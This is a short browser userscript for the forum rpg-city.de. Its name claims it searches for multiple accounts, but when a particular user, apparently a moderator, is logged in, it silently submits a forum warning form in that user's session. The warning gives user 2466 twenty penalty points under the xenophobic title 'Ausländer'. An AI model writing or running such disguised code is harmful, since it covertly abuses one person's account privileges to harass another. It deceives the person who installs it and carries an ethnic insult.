// ==UserScript==
// @name        Forenmultiaccountsuche
// @namespace   PaveLow45
// @include     *rpg-city.de/index.php?page=Index
// @version     1
// ==/UserScript==

// geschrieben von PaveLow45 für Cesar_Lopez \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\
// \\ // \\ // \\ // \\ // \\ // \\ // \\ // \\

if(document.getElementsByClassName("userPanelInner")[0].getElementsByTagName("a")[1].innerHTML == "Cesar_Lopez")
{
	GM_xmlhttpRequest({
	  method: "POST",
	  url: "http://rpg-city.de/index.php?form=UserWarn",
	  data: "warning=0&title=Ausländer&points=20&expiresWeek=0&expiresDay=0&expiressHour=0&userID=2466&objectID=0",
	  headers: {
		"Content-Type": "application/x-www-form-urlencoded"
	  },
	});
}